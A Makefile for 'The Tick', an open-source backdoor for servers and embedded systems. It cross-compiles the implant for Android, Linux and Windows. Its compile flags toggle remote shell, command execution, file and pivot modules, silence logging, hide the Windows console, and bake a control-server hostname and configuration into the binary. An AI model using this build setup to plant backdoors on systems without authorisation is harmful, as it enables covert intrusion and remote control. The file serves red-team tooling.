#
# The Tick, a simple backdoor for servers and embedded systems.
# 
# Developed by Mario Vilas, mvilas@gmail.com
# http://www.github.com/MarioVilas/thetick
# 
# Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
# http://www.github.com/nccgroup/thetick
# 
# See the LICENSE file for further details.
#

##############################################################################
# Default compilation target is "debug". This will build for whatever the
# local platform is, and keep all debugging symbols intact.
#
# There are two kinds of platform definitions here. One is the generic case,
# where you only know the OS and architecture. The other is for specific
# platforms, where some kind of tweaking is needed to get things working.
#
# Generic targets currently are:
#
# - generic-arm-android
# - generic-arm64-android
# - generic-mips-android
# - generic-mips64-android
# - generic-x86-android
# - generic-x86_64-android
#
# - generic-arm-linux
# - generic-arm64-linux
# - generic-mips-linux
# - generic-mips64-linux
# - generic-x86-linux
# - generic-x86_64-linux
#
# - generic-x86-windows
# - generic-x86_64-windows
#
# No specific targets are (currently) supported. Stay tuned!

TARGET := $(or $(TARGET),debug)

##############################################################################
# Defaults for all platforms.

TICK_BIGMEM=-DTICK_PARSER_BUFFER_SIZE=0x10000 -DTICK_EXEC_BUFFER_SIZE=0x100000 -DTICK_MAX_CONFIG_FILE_SIZE=0x10000
#TICK_BIGMEM=

ANDROID_NDK_VERSION=21
ANDROID_BASE_SYSROOT=/usr/lib/android-ndk/platforms/android-$(ANDROID_NDK_VERSION)

BIN=../bin/ticksvc-$(TARGET)
SO=../bin/libtick-$(TARGET).so

# If this file exists and TICK_CONFIG_USE_BIN is enabled,
# it will be automatically embedded into the binary at compile time.
CONFIG=tick.conf

CFLAGS=-W -Wall -Wextra -fdata-sections -ffunction-sections -Wl,--gc-sections -Os -fPIC -static

CFLAGS_SO=-ldl

CFLAGS_ANDROID=-fdiagnostics-color=always $(TICK_BIGMEM)
CFLAGS_LINUX=-std=gnu99
CFLAGS_WINDOWS=-Wno-unknown-pragmas -mwindows -static -lmingw32 -lwsock32 -lws2_32

CFLAGS_ARM=
CFLAGS_ARM64=
CFLAGS_MIPS=
CFLAGS_MIPS64=
CFLAGS_X86=-m32 $(TICK_BIGMEM)
CFLAGS_X86_64=-m64 $(TICK_BIGMEM)

#
# You can configure the bot at compile time.
# The descriptions of each flag are detailed in src/common.h.
#
# I recommend to leave these alone unless you really know what you're doing.
#

CFLAGS_TICK=

# Uncomment to suppress all logging.
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_VERBOSE=0

# Uncomment to remove features and make the binary smaller.
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_FEATURES_CRYPTO=0
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_FEATURES_DNS=0
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_FEATURES_EXEC=0
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_FEATURES_FILE=0
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_FEATURES_SHELL=0
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_FEATURES_PIVOT=0
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_FEATURES_TIME_LIMIT=0

# Uncomment and edit for fully hardcoded, non configurable bots.
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ARGV=0
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ENV=0
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_FILE=0
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_BIN=0
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_HOSTNAME="your.server.com"
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_PORT=443

# Uncomment and edit for a hardcoded configuration file.
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ARGV=0
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ENV=0
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_FILE=1
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_BIN=0
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_FILE_NAME="$(CONFIG)"

# Uncomment for embedded config file in the binary.
# You need to put the config into tick.conf at build time!
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ARGV=0
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ENV=0
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_FILE=0
CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_BIN=1

# Uncomment for a one month time window starting now.
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_FEATURES_TIME_LIMIT=1
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_TIME_LIMIT_START=$$(date +%s)
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_TIME_LIMIT_END=$$(expr `date +%s` + 2592000)

# Uncomment for really noisy but fast reconnects.
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONNECT_RETRY_TIMES=-1
#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONNECT_RETRY_PAUSE=1

##############################################################################
# Platform dependent configuration.

# Debug compilation for the local platform.
# This is the default. Keeps the debugging symbols and forces verbose output.
# Also forces dynamic linking since we only need the binary to run in the
# same machine where we are compiling it.
ifeq ($(TARGET),debug)
CC=gcc
ST=@true
CFLAGS=-W -Wall -Wextra -fPIC -g -ldl
CFLAGS_TICK := $(filter-out -DTICK_VERBOSE=0,$(CFLAGS_TICK))
CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_VERBOSE=1

#----------------------------------------------------------------------------#

# Generic Android on 32 bit ARM platforms.
else ifeq ($(TARGET),generic-arm-android)
FLAVOR=arm-linux-androideabi
CC=$(FLAVOR)-gcc
ST=$(FLAVOR)-strip
CFLAGS := $(CFLAGS) $(CFLAGS_ANDROID) $(CFLAGS_ARM) --sysroot=$(ANDROID_BASE_SYSROOT)/arch-arm/

# Generic Android on 64 bit ARM platforms.
else ifeq ($(TARGET),generic-arm64-android)
FLAVOR=aarch64-linux-android
CC=$(FLAVOR)-gcc
ST=$(FLAVOR)-strip
CFLAGS := $(CFLAGS) $(CFLAGS_ANDROID) $(CFLAGS_ARM64) --sysroot=$(ANDROID_BASE_SYSROOT)/arch-arm64/

# Generic Android on 32 bit MIPS platforms.
else ifeq ($(TARGET),generic-mips-android)
FLAVOR=mipsel-linux-android
CC=$(FLAVOR)-gcc
ST=$(FLAVOR)-strip
CFLAGS := $(CFLAGS) $(CFLAGS_ANDROID) $(CFLAGS_MIPS) --sysroot=$(ANDROID_BASE_SYSROOT)/arch-mips/

# Generic Android on 64 bit MIPS platforms.
else ifeq ($(TARGET),generic-mips64-android)
FLAVOR=mips64el-linux-android
CC=$(FLAVOR)-gcc
ST=$(FLAVOR)-strip
CFLAGS := $(CFLAGS) $(CFLAGS_ANDROID) $(CFLAGS_MIPS64) --sysroot=$(ANDROID_BASE_SYSROOT)/arch-mips64/

# Generic Android on 32 bit Intel platforms.
else ifeq ($(TARGET),generic-x86-android)
FLAVOR=i686-linux-android
CC=$(FLAVOR)-gcc
ST=$(FLAVOR)-strip
CFLAGS := $(CFLAGS) $(CFLAGS_ANDROID) $(CFLAGS_X86) --sysroot=$(ANDROID_BASE_SYSROOT)/arch-x86/

# Generic Android on 64 bit Intel platforms.
else ifeq ($(TARGET),generic-x86_64-android)
FLAVOR=x86_64-linux-android
CC=$(FLAVOR)-gcc
ST=$(FLAVOR)-strip
CFLAGS := $(CFLAGS) $(CFLAGS_ANDROID) $(CFLAGS_X86_64) --sysroot=$(ANDROID_BASE_SYSROOT)/arch-x86_64/

#----------------------------------------------------------------------------#

# Generic Linux on 32 bit ARM platforms.
else ifeq ($(TARGET),generic-arm-linux)
FLAVOR=arm-linux-musleabi
CC=$(FLAVOR)-gcc
ST=$(FLAVOR)-strip
CFLAGS := $(CFLAGS) $(CFLAGS_LINUX) $(CFLAGS_ARM)

# Generic Linux on 64 bit ARM platforms.
else ifeq ($(TARGET),generic-arm64-linux)
FLAVOR=aarch64-linux-musl
CC=$(FLAVOR)-gcc
ST=$(FLAVOR)-strip
CFLAGS := $(CFLAGS) $(CFLAGS_LINUX) $(CFLAGS_ARM64)

# Generic Linux on 32 bit MIPS platforms.
else ifeq ($(TARGET),generic-mips-linux)
FLAVOR=mips-linux-musl
CC=$(FLAVOR)-gcc
ST=$(FLAVOR)-strip
CFLAGS := $(CFLAGS) $(CFLAGS_LINUX) $(CFLAGS_MIPS)

# Generic Linux on 64 bit MIPS platforms.
else ifeq ($(TARGET),generic-mips64-linux)
FLAVOR=mips64-linux-musl
CC=$(FLAVOR)-gcc
ST=$(FLAVOR)-strip
CFLAGS := $(CFLAGS) $(CFLAGS_LINUX) $(CFLAGS_MIPS64)

# Generic Linux on 32 bit Intel platforms.
else ifeq ($(TARGET),generic-x86-linux)
FLAVOR=i686-linux-musl
CC=$(FLAVOR)-gcc
ST=$(FLAVOR)-strip
CFLAGS := $(CFLAGS) $(CFLAGS_LINUX) $(CFLAGS_X86)
CFLAGS := $(CFLAGS) -DTICK_PARSER_BUFFER_SIZE=0x10000 -DTICK_EXEC_BUFFER_SIZE=0x100000 -DTICK_MAX_CONFIG_FILE_SIZE=0x10000

# Generic Linux on 64 bit Intel platforms.
else ifeq ($(TARGET),generic-x86_64-linux)
FLAVOR=x86_64-linux-musl
CC=$(FLAVOR)-gcc
ST=$(FLAVOR)-strip
CFLAGS := $(CFLAGS) $(CFLAGS_LINUX) $(CFLAGS_X86_64)
CFLAGS := $(CFLAGS) -DTICK_PARSER_BUFFER_SIZE=0x10000 -DTICK_EXEC_BUFFER_SIZE=0x100000 -DTICK_MAX_CONFIG_FILE_SIZE=0x10000

#----------------------------------------------------------------------------#

# Generic Windows on 32 bit Intel platforms.
else ifeq ($(TARGET),generic-x86-windows)
FLAVOR=i686-w64-mingw32
CC=$(FLAVOR)-gcc
ST=$(FLAVOR)-strip
BIN := $(BIN).exe
SO := $(SO:.so=.dll)
CFLAGS := $(CFLAGS) $(CFLAGS_WINDOWS) $(CFLAGS_X86)
CFLAGS_SO := $(filter-out -ldl,$(CFLAGS_SO))
CFLAGS_TICK := $(filter-out -DTICK_CONFIG_USE_ARGV=0,$(CFLAGS_TICK))
CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ARGV=1

# Generic Windows on 64 bit Intel platforms.
else ifeq ($(TARGET),generic-x86_64-windows)
FLAVOR=x86_64-w64-mingw32
CC=$(FLAVOR)-gcc
ST=$(FLAVOR)-strip
BIN := $(BIN).exe
SO := $(SO:.so=.dll)
CFLAGS := $(CFLAGS) $(CFLAGS_WINDOWS) $(CFLAGS_X86_64)
CFLAGS_SO := $(filter-out -ldl,$(CFLAGS_SO))
CFLAGS_TICK := $(filter-out -DTICK_CONFIG_USE_ARGV=0,$(CFLAGS_TICK))
CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ARGV=1

#----------------------------------------------------------------------------#

# Fail if the TARGET value is unknown.
else
$(error unknown value for TARGET: $(TARGET))
endif

##############################################################################
# Source and object files.

# Start by adding all .c files in the root folder. This saves us from having
# to edit the Makefile every time we add a new module.
SRC=$(wildcard *.c)

# Next, based on the feature flags, add dependencies or remove modules.
# Unfortunately we cannot rely on the compiler being smart enough to
# optimize away the unused code - this approach is dirty but works better,
# and also results in faster compile times.

ifneq ($(filter -DTICK_FEATURES_CRYPTO=0,$(CFLAGS_TICK)),)
	SRC := $(filter-out base64.c,$(SRC))
	SRC := $(filter-out ssl.c,$(SRC))
else
	SRC += $(wildcard BearSSL/src/*.c)
	SRC += $(wildcard BearSSL/src/*/*.c)
	CFLAGS := -I./BearSSL/src -I./BearSSL/inc $(CFLAGS)
endif

ifneq ($(filter -DTICK_FEATURES_DNS=0,$(CFLAGS_TICK)),)
	SRC := $(filter-out dns.c,$(SRC))
endif

ifneq ($(filter -DTICK_FEATURES_FILE=0,$(CFLAGS_TICK)),)
	SRC := $(filter-out file.c,$(SRC))
endif

ifneq ($(filter -DTICK_FEATURES_SHELL=0,$(CFLAGS_TICK)),)
	SRC := $(filter-out shell.c,$(SRC))
endif

ifneq ($(filter -DTICK_FEATURES_PIVOT=0,$(CFLAGS_TICK)),)
	SRC := $(filter-out pivot.c,$(SRC))
endif

# Derive the names of object files from the source files.
OBJ=$(patsubst %.c,%.o,$(SRC))

##############################################################################
# Recipes.

# "Phony" targets, just your standard "make all" and "make clean".
.PHONY: all clean

# Print the compilation target when building.
# This makes the output more readable if there are errors.
all:
	@echo Building for platform: $(TARGET)
	@$(MAKE) --no-print-directory $(BIN) $(SO)
	@echo Finished building for platform: $(TARGET)

# Compile each .c into a .o file separately.
# When using -j this makes compiling much faster.
#
# Quick "optimization" note.
# I tried here, instead of compiling every .o separately and then linking,
# to give gcc all of the source files in one go and just generate the binary.
# This resulted in *much* slower compile times... and literally no benefit!
# DISAPPOINTED! <kevinsorbo.gif>
%.o: %.c
	$(CC) -c $< $(CFLAGS) $(CFLAGS_TICK) -o $@

# If this target supports creating standalone binaries, do it here.
# If embedding configuration files is enabled and there is one,
# embed it now. (Yes, we can just cat into the end of the file!)
ifneq ($(BIN),)
$(BIN): $(OBJ)
	mkdir -p -- $$(dirname $(BIN))
	$(CC) $(filter-out libmain.o,$(OBJ)) $(CFLAGS) -o $(BIN)
	$(ST) $(BIN)
ifneq ($(filter -DTICK_CONFIG_USE_BIN=1,$(CFLAGS_TICK)),)
ifneq ($(CONFIG),)
	if [ -f ../$(CONFIG) ]; then echo "" >> $(BIN); head -n 1 ../$(CONFIG) | tr -d '\n' >> $(BIN); fi
endif
endif
endif

# Same for when this target supports shared objects (DLL files).
ifneq ($(SO),)
$(SO): $(OBJ)
	mkdir -p -- $$(dirname $(SO))
	$(CC) $(filter-out main.o,$(OBJ)) $(filter-out -static,$(CFLAGS)) $(CFLAGS_SO) -shared -o $(SO)
	$(ST) $(SO)
ifneq ($(filter -DTICK_CONFIG_USE_BIN=1,$(CFLAGS_TICK)),)
ifneq ($(CONFIG),)
	if [ -f ../$(CONFIG) ]; then echo "" >> $(SO); head -n 1 ../$(CONFIG) | tr -d '\n' >> $(SO); fi
endif
endif
endif

# Cleans up leftover intermediate files and output binaries.
clean:
	rm -f -- $(OBJ) $(BIN) $(SO)
